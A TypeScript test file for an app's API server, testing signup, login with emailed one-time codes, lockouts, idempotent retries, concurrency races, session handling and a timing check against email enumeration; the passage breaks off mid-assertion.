import assert from "node:assert/strict";
import { createHash, randomUUID } from "node:crypto";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test } from "node:test";
import type { AgentStepEvent, ProductSpec } from "@forge/shared";
import {
  diffAndMigrate,
  findUserByEmail,
  getCalendarFeedToken,
  insertAutomationRule,
  insertCheckpoint,
  insertProject,
  insertRecord,
  insertWhatsAppMessage,
  markProjectBuilt,
  quoteIdentifier,
  recordAutomationRun,
  tableNameFor,
  updateProjectSpec,
  type ForgeDatabase,
} from "@forge/db";
import { HeuristicSpecProvider, type SpecProvider } from "@forge/spec-engine";
import { createApp, errorMiddleware } from "./app.js";
import { runScheduledAutomationsCheck } from "./automations.js";
import type { EmailSender } from "./email.js";
import { createStore } from "./store.js";
import { WhatsAppWebManager, type BaileysConnectionUpdate, type BaileysMessagesUpsert, type WhatsAppSocket } from "./whatsappWeb.js";

/**
 * A controllable EmailSender double for the login-code tests: records every
 * send() call and lets the test decide whether it succeeds. `gateFirstSend`
 * (round 538) makes only the FIRST call to send() park on a manually
 * released promise -- every later call resolves immediately -- the same
 * "first-call-only gate" idiom as this file's own createGatedProvider(),
 * applied to EmailSender.send instead of SpecProvider.generate, for testing
 * two concurrent /auth/login calls racing each other's own network await.
 */
function createFakeEmailSender(
  // Round 1296: `failFromCall` lets a test simulate a transient provider
  // outage that only starts after one or more earlier calls already
  // succeeded -- unlike the plain `failWith` (which fails every call from
  // the first), this is the shape a real "the first reset email went out
  // fine, then Resend blipped on the second request" scenario needs.
  // 1-based: `failFromCall: 2` means the 1st call succeeds and every call
  // from the 2nd onward throws.
  opts?: { configured?: boolean; failWith?: Error; gateFirstSend?: boolean; failFromCall?: number },
): EmailSender & {
  sentTo: { to: string; subject: string; text: string }[];
  waitUntilFirstSendStarted: () => Promise<void>;
  releaseFirstSend: () => void;
} {
  const sentTo: { to: string; subject: string; text: string }[] = [];
  let sendCallCount = 0;
  let releaseFirstSend: () => void = () => {};
  let signalFirstSendStarted: () => void = () => {};
  const firstSendStarted = new Promise<void>((res) => {
    signalFirstSendStarted = res;
  });
  const firstSendGate = new Promise<void>((res) => {
    releaseFirstSend = res;
  });
  return {
    configured: opts?.configured ?? true,
    sentTo,
    waitUntilFirstSendStarted: () => firstSendStarted,
    releaseFirstSend: () => releaseFirstSend(),
    async send(to, subject, text) {
      sendCallCount++;
      if (opts?.gateFirstSend && sendCallCount === 1) {
        signalFirstSendStarted();
        await firstSendGate;
      }
      if (opts?.failWith && (opts.failFromCall === undefined || sendCallCount >= opts.failFromCall)) {
        throw opts.failWith;
      }
      sentTo.push({ to, subject, text });
    },
  };
}

async function withServer(
  fn: (baseUrl: string, db: ForgeDatabase, uploadsDir: string) => Promise<void>,
  opts?: { whatsapp?: (db: ForgeDatabase) => WhatsAppWebManager; provider?: SpecProvider; emailSender?: EmailSender },
) {
  const db = createStore(":memory:");
  // A real, isolated temp directory per test rather than createApp's own
  // shared os.tmpdir()-based default -- lets the upload-route tests below
  // assert against real files on disk without ever touching a directory
  // another concurrently-running test might also be writing into.
  const uploadsDir = mkdtempSync(path.join(tmpdir(), "forge-uploads-test-"));
  const app = createApp(db, opts?.provider, undefined, opts?.whatsapp?.(db), opts?.emailSender, uploadsDir);
  const server = app.listen(0);
  await new Promise<void>((resolve) => server.once("listening", resolve));
  const address = server.address();
  const port = typeof address === "object" && address ? address.port : 0;
  try {
    await fn(`http://127.0.0.1:${port}`, db, uploadsDir);
  } finally {
    // server.close()'s own callback doesn't fire until every open
    // connection closes on its own -- a keep-alive socket sitting idle
    // (e.g. from two concurrent fetches to this same origin in one test)
    // can leave it waiting out a multi-minute keep-alive timeout instead
    // of actually closing. closeAllConnections() destroys any still-open
    // sockets immediately so teardown never depends on client-side
    // keep-alive behavior.
    server.closeAllConnections();
    await new Promise<void>((resolve) => server.close(() => resolve()));
    rmSync(uploadsDir, { recursive: true, force: true });
  }
}

/**
 * Real Baileys sockets talk to WhatsApp's actual servers over a raw
 * WebSocket, unreachable from this sandboxed dev environment (confirmed by
 * a direct probe before writing this test double -- see docs/roadmap.md).
 * These route-level tests inject a fake socket factory so the real
 * connect/status/send/disconnect HTTP surface can still be exercised
 * end-to-end against the app's own real running server.
 */
function createFakeWhatsAppSocket(opts?: { logout?: () => Promise<void>; sendMessage?: () => Promise<void> }) {
  let connectionUpdateHandler: ((u: BaileysConnectionUpdate) => void) | undefined;
  let messagesUpsertHandler: ((u: BaileysMessagesUpsert) => void) | undefined;
  // `content` (round 965) is the full, real content object sendMessage
  // received -- the `text`/`document`/`image`/`video` shape -- alongside
  // `text`, kept for every existing caller's own convenience.
  const sendCalls: { jid: string; text?: string; content: Parameters<WhatsAppSocket["sendMessage"]>[1] }[] = [];
  const sock: WhatsAppSocket = {
    ev: {
      on(event, listener) {
        if (event === "connection.update") connectionUpdateHandler = listener as (u: BaileysConnectionUpdate) => void;
        if (event === "messages.upsert") messagesUpsertHandler = listener as (u: BaileysMessagesUpsert) => void;
      },
    },
    user: null,
    // Real Baileys sendMessage() is a network round-trip (a genuine await) --
    // opts.sendMessage lets a test hold that open with a controlled promise
    // to deterministically land inside POST .../whatsapp/send's own in-flight
    // window (round 536's own convention, mirroring opts.logout below).
    async sendMessage(jid, content) {
      sendCalls.push({ jid, text: "text" in content ? content.text : undefined, content });
      await opts?.sendMessage?.();
      return {};
    },
    // Real Baileys logout() is a network round-trip (a genuine await) --
    // opts.logout lets a test hold that open with a controlled promise to
    // deterministically land inside DELETE /projects/:id's own in-flight
    // window, instead of racing real timers (round 530's own convention).
    async logout() {
      await opts?.logout?.();
    },
  };
  return {
    sock,
    sendCalls,
    emitConnectionUpdate: (u: BaileysConnectionUpdate) => connectionUpdateHandler?.(u),
    emitMessagesUpsert: (u: BaileysMessagesUpsert) => messagesUpsertHandler?.(u),
  };
}

function createTestWhatsAppManager(
  db: ForgeDatabase,
  opts?: { logout?: () => Promise<void>; sendMessage?: () => Promise<void>; sendSpacingMs?: number },
) {
  const createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  const manager = new WhatsAppWebManager({
    db,
    sessionsRootDir: "/tmp/forge-whatsapp-apptest-sessions",
    createSocket: async () => {
      const fake = createFakeWhatsAppSocket(opts);
      createdSockets.push(fake);
      return { sock: fake.sock, saveCreds: async () => {} };
    },
    qrToDataUrl: async (qr) => `data:image/png;base64,FAKE(${qr})`,
    sendSpacingMs: opts?.sendSpacingMs,
  });
  return { manager, createdSockets };
}

async function signup(baseUrl: string, email = `user-${Math.random()}@example.com`): Promise<string> {
  const res = await fetch(`${baseUrl}/api/auth/signup`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ email, password: "correct-horse-battery" }),
  });
  assert.equal(res.status, 201);
  const { token } = (await res.json()) as { token: string };
  return token;
}

function authHeaders(token: string) {
  return { "content-type": "application/json", authorization: `Bearer ${token}` };
}

async function collectSSE(res: Response): Promise<AgentStepEvent[]> {
  const reader = res.body!.getReader();
  const decoder = new TextDecoder();
  let buffer = "";
  const events: AgentStepEvent[] = [];
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, { stream: true });
    let idx: number;
    while ((idx = buffer.indexOf("\n\n")) !== -1) {
      const frame = buffer.slice(0, idx);
      buffer = buffer.slice(idx + 2);
      const line = frame.split("\n").find((l) => l.startsWith("data: "));
      if (line) events.push(JSON.parse(line.slice("data: ".length)));
    }
  }
  return events;
}

/**
 * Round 797: a streaming route (routes/projects.ts's streamPipeline, the
 * build/refine SSE endpoint) calls res.writeHead(200, ...) long before an
 * error from inside the stream could ever reach this middleware -- before
 * this round, every branch here called res.status(...)/res.json(...)
 * unconditionally, which throws its own synchronous ERR_HTTP_HEADERS_SENT
 * once headers are already on the wire, masking the real error instead of
 * letting it reach the client. A unit test against a fake Response is used
 * here (rather than a real HTTP round-trip) specifically because a real
 * Express response whose headers are already sent really does tear down
 * the socket once next(err) reaches Express's own default handler -- not
 * something a test could usefully assert on afterwards.
 */
test("errorMiddleware hands off to next(err) instead of trying to send a second response once headers are already sent", () => {
  const statusCalls: number[] = [];
  const fakeRes = {
    headersSent: true,
    status(code: number) {
      statusCalls.push(code);
      return this;
    },
    json() {
      throw new Error("ERR_HTTP_HEADERS_SENT: should never be called once headers are sent");
    },
  };
  let nextCalledWith: unknown;
  const next = (err: unknown) => {
    nextCalledWith = err;
  };

  const realError = new Error("disk full while finalizing the build");
  assert.doesNotThrow(() => {
    errorMiddleware(realError, {} as never, fakeRes as never, next as never);
  });
  assert.equal(nextCalledWith, realError, "the real error must be handed to next(), not swallowed or replaced");
  assert.deepEqual(statusCalls, [], "must never attempt to set a status/send a body once headers are already sent");
});

test("errorMiddleware still sends a normal response when headers have not been sent yet", () => {
  const statusCalls: number[] = [];
  let jsonBody: unknown;
  const fakeRes = {
    headersSent: false,
    status(code: number) {
      statusCalls.push(code);
      return this;
    },
    json(body: unknown) {
      jsonBody = body;
    },
  };
  const next = () => {
    throw new Error("next() must not be called when headers have not been sent");
  };

  errorMiddleware(new Error("boom"), {} as never, fakeRes as never, next as never);
  assert.deepEqual(statusCalls, [500]);
  assert.deepEqual(jsonBody, { error: "Internal server error", code: "INTERNAL_ERROR" });
});

test("health check responds ok", async () => {
  await withServer(async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/health`);
    assert.equal(res.status, 200);
    assert.deepEqual(await res.json(), { status: "ok" });
  });
});

test("signup rejects a duplicate email and login rejects a wrong password", async () => {
  await withServer(async (baseUrl) => {
    const email = "dana@example.com";
    await signup(baseUrl, email);
    const dup = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    assert.equal(dup.status, 409);
    assert.equal(((await dup.json()) as { code?: string }).code, "EMAIL_TAKEN");

    const badLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "wrong-password" }),
    });
    assert.equal(badLogin.status, 401);
    assert.equal(((await badLogin.json()) as { code?: string }).code, "INVALID_CREDENTIALS");

    const goodLogin = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    assert.equal(goodLogin.status, 200);
  });
});

/**
 * createUser (packages/db/src/users.ts) does its "does this email already
 * exist" SELECT and its INSERT back to back with no `await` between them --
 * both run on node:sqlite's synchronous DatabaseSync, so the whole check
 * is one atomic JS turn no other request's code can interleave into.
 * signup's only real await is hashPassword, whose scrypt call is
 * genuinely offloaded to libuv's threadpool (see auth/password.ts's own
 * comment on why) -- so two concurrent signups for the same email
 * naturally overlap there, in real wall-clock time, with no artificial
 * gate needed to prove it. This was never actually exercised by any
 * existing test: the "rejects a duplicate email" test above only ever
 * sends the second signup after the first has already fully completed.
 */
test("two concurrent signups for the same email: exactly one succeeds, and the loser gets a clean 409 EMAIL_TAKEN, never a raw SQL error or a duplicate row", async () => {
  await withServer(async (baseUrl) => {
    const email = `race-${Date.now()}@example.com`;
    const [resA, resB] = await Promise.all([
      fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery-a" }),
      }),
      fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery-b" }),
      }),
    ]);

    const statuses = [resA.status, resB.status].sort();
    assert.deepEqual(statuses, [201, 409], "exactly one of the two concurrent signups must succeed");

    const loserRes = resA.status === 409 ? resA : resB;
    const loserBody = (await loserRes.json()) as { code?: string; error?: string };
    assert.equal(loserBody.code, "EMAIL_TAKEN", "the loser must get a clean, recognizable error code, not a raw SQL constraint message");
    assert.ok(!/UNIQUE constraint|SQLITE/i.test(loserBody.error ?? ""), `must not leak a raw SQL error: ${loserBody.error}`);

    // Only one account for this email should exist -- log in with the
    // winning password to prove there's exactly one, not a silently
    // created duplicate row.
    const winnerRes = resA.status === 201 ? resA : resB;
    const winnerPassword = resA.status === 201 ? "correct-horse-battery-a" : "correct-horse-battery-b";
    assert.equal(winnerRes.status, 201);
    const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: winnerPassword }),
    });
    assert.equal(loginRes.status, 200);
  });
});

/**
 * Once an EmailSender reports `configured: true` (i.e. RESEND_API_KEY is
 * set, see email.ts), a correct password no longer returns a token directly
 * -- it sends a code by email and returns `{ requiresCode, loginCodeId }`
 * instead, and only POST /auth/login/verify-code with the right code
 * actually completes the login. These tests exercise that whole real
 * server-side flow with a fake, inspectable EmailSender double.
 */
test("login with an EmailSender configured sends an emailed code instead of a token, and the right code completes the login via verify-code", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });

      const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery", lang: "en" }),
      });
      assert.equal(loginRes.status, 200);
      const loginBody = (await loginRes.json()) as { requiresCode?: boolean; loginCodeId?: string; token?: string };
      assert.equal(loginBody.requiresCode, true);
      assert.equal(loginBody.token, undefined, "a plaintext token must never be returned before the code is verified");
      assert.ok(loginBody.loginCodeId);

      assert.equal(emailSender.sentTo.length, 1);
      assert.equal(emailSender.sentTo[0]!.to, email);
      const code = emailSender.sentTo[0]!.text.match(/\d{6}/)?.[0];
      assert.ok(code, "the email body must contain the 6-digit code");

      const verifyRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId: loginBody.loginCodeId, code }),
      });
      assert.equal(verifyRes.status, 200);
      const verifyBody = (await verifyRes.json()) as { user: { email: string }; token: string };
      assert.equal(verifyBody.user.email, email);
      assert.ok(verifyBody.token);

      // The now-used code must be rejected on a second attempt -- a code is
      // single-use, not reusable until its own TTL.
      const reuseRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId: loginBody.loginCodeId, code }),
      });
      assert.equal(reuseRes.status, 401);
      assert.equal(((await reuseRes.json()) as { code?: string }).code, "LOGIN_CODE_EXPIRED");
    },
    { emailSender },
  );
});

/**
 * Round 1334: the exact same fetchWithWakeRetry lost-response risk round
 * 1328 fixed for signup -- verify-code's own success (deleteLoginCode +
 * issueSession) invalidates the exact precondition a retry re-checks
 * (`getLoginCode` now returns nothing, since the code is single-use), so a
 * response lost in transit after the server already completed the login
 * made a retry fail with a false 401 LOGIN_CODE_EXPIRED for a login that,
 * the replayed token matching below proves, already fully succeeded.
 */
test("POST /auth/login/verify-code retried with the same idempotency key after the first attempt already succeeded replays the original response, instead of 401ing with LOGIN_CODE_EXPIRED", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = `verify-idem-1-${Date.now()}@example.com`;
      await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery", lang: "en" }),
      });
      const { loginCodeId } = (await loginRes.json()) as { loginCodeId: string };
      const code = emailSender.sentTo[0]!.text.match(/\d{6}/)?.[0];

      const headers = { "content-type": "application/json", "x-idempotency-key": "verify-code-repro-key" };
      const body = JSON.stringify({ loginCodeId, code });

      const firstRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, { method: "POST", headers, body });
      assert.equal(firstRes.status, 200);
      const first = (await firstRes.json()) as { user: { id: string }; token: string };

      const retryRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, { method: "POST", headers, body });
      assert.equal(
        retryRes.status,
        200,
        "a retried verify-code with the same idempotency key must replay the original success, not 401 now that the code is already consumed",
      );
      const retry = (await retryRes.json()) as { user: { id: string }; token: string };
      assert.equal(retry.user.id, first.user.id, "the replayed response must be the exact same login, not a second one");
      assert.equal(retry.token, first.token);
    },
    { emailSender },
  );
});

test("verify-code rejects a wrong code without consuming it, locks it out after too many wrong attempts, and the right code still works right up until that lockout", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const { loginCodeId } = (await loginRes.json()) as { loginCodeId: string };
      const realCode = emailSender.sentTo[0]!.text.match(/\d{6}/)![0];
      const wrongCode = realCode === "000000" ? "111111" : "000000";

      for (let i = 0; i < 5; i++) {
        const res = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ loginCodeId, code: wrongCode }),
        });
        assert.equal(res.status, 401);
        assert.equal(((await res.json()) as { code?: string }).code, "INVALID_LOGIN_CODE", `attempt ${i + 1} of 5 must still be a plain wrong-code error`);
      }

      // The 6th attempt (even with the RIGHT code) must now be locked out --
      // MAX_LOGIN_CODE_ATTEMPTS (5) wrong guesses already happened.
      const lockedOutRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId, code: realCode }),
      });
      assert.equal(lockedOutRes.status, 401);
      assert.equal(((await lockedOutRes.json()) as { code?: string }).code, "LOGIN_CODE_EXPIRED");
    },
    { emailSender },
  );
});

test("a login code is scoped to one login attempt: requesting a second one invalidates the first, and signup/login stay token-immediate when no EmailSender is configured at all", async () => {
  await withServer(async (baseUrl) => {
    // The default withServer (no emailSender option) uses createApp's own
    // default ResendEmailSender, which is unconfigured in this test
    // environment (no RESEND_API_KEY) -- confirming the code step stays
    // fully inert end-to-end, not just at the unit level.
    const email = "dana@example.com";
    await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    assert.equal(loginRes.status, 200);
    const body = (await loginRes.json()) as { token?: string; requiresCode?: boolean };
    assert.ok(body.token, "login must return a usable token directly when no email provider is configured");
    assert.equal(body.requiresCode, undefined);
  });
});

test("requesting a fresh login code invalidates the previous one for the same account", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const firstLogin = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const { loginCodeId: firstId } = (await firstLogin.json()) as { loginCodeId: string };

      // Abandon the first attempt and log in again -- a second, independent code.
      await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const secondCode = emailSender.sentTo[1]!.text.match(/\d{6}/)![0];

      // The first code's own row is gone -- even the right code for it now fails.
      const firstCodeMatch = emailSender.sentTo[0]!.text.match(/\d{6}/)![0];
      const staleRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId: firstId, code: firstCodeMatch }),
      });
      assert.equal(staleRes.status, 401);
      assert.equal(((await staleRes.json()) as { code?: string }).code, "LOGIN_CODE_EXPIRED");

      // The second, current code still works.
      const { loginCodeId: secondId } = (await (
        await fetch(`${baseUrl}/api/auth/login`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ email, password: "correct-horse-battery" }),
        })
      ).json()) as { loginCodeId: string };
      const thirdCode = emailSender.sentTo[2]!.text.match(/\d{6}/)![0];
      const okRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId: secondId, code: thirdCode }),
      });
      assert.equal(okRes.status, 200);
      void secondCode; // captured for clarity on the (deleted) second attempt; the third is what's actually verified above
    },
    { emailSender },
  );
});

test("two concurrent /auth/login calls for the same account must not let one invalidate the other's row before that other's own response is sent", async () => {
  const emailSender = createFakeEmailSender({ gateFirstSend: true });
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });

      // Request A's send() is the gate's first call -> parks until released.
      const requestA = fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      await emailSender.waitUntilFirstSendStarted();

      // Request B's send() is the gate's second call -> resolves immediately,
      // so B's own write+respond can complete while A is still parked.
      const resB = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      assert.equal(resB.status, 200);
      const { loginCodeId: idB } = (await resB.json()) as { loginCodeId: string };

      emailSender.releaseFirstSend();
      const resA = await requestA;
      assert.equal(resA.status, 200);
      const { loginCodeId: idA } = (await resA.json()) as { loginCodeId: string };
      assert.notEqual(idA, idB);

      // A's response named idA -- that row must exist at this point, even
      // though B's overlapping deleteLoginCodesForUser ran while A was
      // still parked on its own send(). A wrong-code probe distinguishes
      // "row exists" (INVALID_LOGIN_CODE) from "row is gone"
      // (LOGIN_CODE_EXPIRED), without needing A's real 6-digit code.
      const probeRes = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId: idA, code: "000000" }),
      });
      const probeBody = (await probeRes.json()) as { code?: string };
      assert.equal(
        probeBody.code,
        "INVALID_LOGIN_CODE",
        "request A's own loginCodeId must still name a row right after A's response carried it, not have been deleted out from under it by B's overlapping invalidation",
      );
    },
    { emailSender },
  );
});

test("login returns EMAIL_SEND_FAILED (and no usable loginCodeId) when the configured EmailSender's send() itself throws", async () => {
  const emailSender = createFakeEmailSender({ failWith: new Error("Resend API request failed (401): invalid api key") });
  await withServer(
    async (baseUrl) => {
      const email = "dana@example.com";
      await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      assert.equal(loginRes.status, 502);
      assert.equal(((await loginRes.json()) as { code?: string }).code, "EMAIL_SEND_FAILED");
    },
    { emailSender },
  );
});

test("email casing is normalized: signing up as 'Dana@Example.com' can log in as 'dana@example.com', and a second signup with different casing is rejected as a duplicate", async () => {
  await withServer(async (baseUrl) => {
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "Dana@Example.com", password: "correct-horse-battery" }),
    });
    assert.equal(signupRes.status, 201);
    const { user } = (await signupRes.json()) as { user: { email: string } };
    assert.equal(user.email, "dana@example.com");

    const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "dana@example.com", password: "correct-horse-battery" }),
    });
    assert.equal(loginRes.status, 200);

    const dupSignupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "DANA@EXAMPLE.COM", password: "another-password" }),
    });
    assert.equal(dupSignupRes.status, 409);
    assert.equal(((await dupSignupRes.json()) as { code?: string }).code, "EMAIL_TAKEN");
  });
});

test("GET /api/auth/me returns the signed-up user's own profile for a valid session, and 401s for a missing/garbage/expired token", async () => {
  await withServer(async (baseUrl) => {
    const email = `me-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "correct-horse-battery" }),
    });
    assert.equal(signupRes.status, 201);
    const { user: signedUpUser, token } = (await signupRes.json()) as {
      user: { id: string; email: string; createdAt: string };
      token: string;
    };

    const meRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });
    assert.equal(meRes.status, 200);
    const { user: meUser } = (await meRes.json()) as { user: { id: string; email: string; createdAt: string } };
    assert.deepEqual(meUser, signedUpUser);

    const noHeaderRes = await fetch(`${baseUrl}/api/auth/me`);
    assert.equal(noHeaderRes.status, 401);
    assert.equal(((await noHeaderRes.json()) as { code?: string }).code, "AUTH_REQUIRED");

    const garbageTokenRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders("not-a-real-token") });
    assert.equal(garbageTokenRes.status, 401);
    assert.equal(((await garbageTokenRes.json()) as { code?: string }).code, "SESSION_EXPIRED");

    await fetch(`${baseUrl}/api/auth/logout`, { method: "POST", headers: authHeaders(token) });
    const afterLogoutRes = await fetch(`${baseUrl}/api/auth/me`, { headers: authHeaders(token) });
    assert.equal(afterLogoutRes.status, 401);
  });
});

test("an invalid signup/login payload gets a readable validation message, not a raw JSON dump of Zod's internal issues", async () => {
  await withServer(async (baseUrl) => {
    const res = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "not-an-email", password: "short" }),
    });
    assert.equal(res.status, 400);
    const { error } = (await res.json()) as { error: string };
    // Not JSON.stringify(issues, null, 2) -- a real, readable sentence.
    assert.doesNotMatch(error, /^\[?\s*\{/);
    assert.match(error, /password must be at least 8 characters/);
  });
});

test("the Authorization scheme name is accepted case-insensitively ('bearer' works, not just 'Bearer'), and logout actually deletes the session so the same token is rejected afterward", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl);

    const lowerSchemeRes = await fetch(`${baseUrl}/api/projects`, { headers: { authorization: `bearer ${token}` } });
    assert.equal(lowerSchemeRes.status, 200);

    const logoutRes = await fetch(`${baseUrl}/api/auth/logout`, { method: "POST", headers: authHeaders(token) });
    assert.equal(logoutRes.status, 204);

    const afterLogoutRes = await fetch(`${baseUrl}/api/projects`, { headers: authHeaders(token) });
    assert.equal(afterLogoutRes.status, 401);
    assert.equal(((await afterLogoutRes.json()) as { code?: string }).code, "SESSION_EXPIRED");
  });
});

/**
 * verifyPassword's scrypt call costs tens of milliseconds -- login used to
 * only run it when the email matched a real user (record?.passwordHash
 * would be undefined otherwise, short-circuiting before verifyPassword was
 * ever called), so a login attempt for an email that doesn't exist at all
 * returned near-instantly while one for a real email with the wrong
 * password took the full scrypt cost. That's a reliable, easily-measured
 * timing side-channel an attacker could use to enumerate registered
 * emails without ever seeing a different response body or status code.
 * See docs/roadmap.md and the dummyPasswordHashPromise comment in
 * apps/api/src/routes/auth.ts for the fix. This is a real wall-clock
 * timing test (not a mock), taking several samples and comparing medians
 * to stay robust against normal test-environment jitter, since the actual
 * security property being verified only exists in real elapsed time.
 */
test("login takes comparable time for a wrong password on a real account vs. an email that doesn't exist at all, instead of leaking which emails are registered via response timing", async () => {
  await withServer(async (baseUrl) => {
    const realEmail = `timing-${Date.now()}@example.com`;
    await signup(baseUrl, realEmail);

    async function timeLogin(email: string, password: string): Promise<number> {
      const start = process.hrtime.bigint();
      await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      return Number(process.hrtime.bigint() - start) / 1e6;
    }

    // Warm up (first call in a fresh process can be slower for unrelated reasons).
    await timeLogin(realEmail, "wrongpassword-warmup");

    const wrongPasswordTimes: number[] = [];
    const noSuchEmailTimes: number[] = [];
    for (let i = 0; i < 6; i++) {
      wrongPasswordTimes.push(await timeLogin(realEmail, "definitely-wrong-password"));
      noSuchEmailTimes.push(await timeLogin(`nobody-${i}-${Date.now()}@example.com`, "whatever-password"));
    }
    const median = (values: number[]) => values.slice().sort((a, b) => a - b)[Math.floor(values.length / 2)];
    const wrongPasswordMedian = median(wrongPasswordTimes);
    const noSuchEmailMedian = median(noSuchEmailTimes);

    // The pre-fix "no such email" path returned in well under 1ms; a real
    // scrypt call costs tens of ms, so this floor alone already proves the
    // expensive hash actually ran for a nonexistent email too.
    assert.ok(
      noSuchEmailMedian > 5,
      `expected the "no such email" login to still pay the real password-hashing cost (>5ms), got ${noSuchEmailMedian}ms median -- the timing side-channel may not be fixed`,
    );
    const ratio = Math.max(wrongPasswordMedian, noSuchEmailMedian) / Math.min(wrongPasswordMedian, noSuchEmailMedian);
    assert.ok(
      ratio < 3,
